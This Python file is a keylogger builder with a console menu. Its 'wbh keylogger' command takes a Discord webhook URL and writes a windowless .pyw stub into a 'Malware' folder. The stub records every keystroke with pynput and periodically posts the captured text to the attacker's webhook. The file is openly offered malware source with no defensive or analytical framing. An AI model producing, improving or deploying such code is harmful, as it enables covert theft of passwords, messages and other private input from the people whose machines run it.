import os

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

class KeyLogger:
    def __init__(self, discord_keylogger):
        self.discord_keylogger = discord_keylogger

    def run(self):
        mlwr_folder = "Malware"
        os.makedirs(mlwr_folder, exist_ok=True)
        if self.discord_keylogger:
            filename = os.path.join(mlwr_folder, "discord_keylogger.pyw")
            print("Program is asking for a webhook")
            self.webhook_raw = input("console//: ")
            webhook = self.webhook_raw.strip()
            with open(filename, "w") as f:
                stub = f"""
import aiohttp
from pynput import keyboard
import asyncio


class Execution:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("{webhook}", json=self.json):
                pass

    async def send_data(self):
            self.json = {{
                "content": f"```{{self.text}}```"
            }}
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            asyncio.sleep(10)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\\n{{key}}"
            

    async def run(self):
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()


if __name__ == '__main__':
    execution = Execution()
    asyncio.run(execution.run())

    """
                f.write(stub)
                input(f"Keylogger created at {filename}... Press Enter to continue...")
        else:
            pass



def help():
    help_message = """
(!! HELP FUNCTION TRIGGERED !!)

The Following lines of text are commands for "console//:"

keylogger

"""
    print(help_message)
    input("\nPress Enter to Leave...")
    main()

def main():
    clear()
    option_raw = input("\nconsole//: ")
    option = option_raw.lower().strip()
    if option == "help":
        help()
    elif option == "wbh keylogger":
        keylogger_execute = KeyLogger(discord_keylogger=True)
        keylogger_execute.run()


while True:
    main()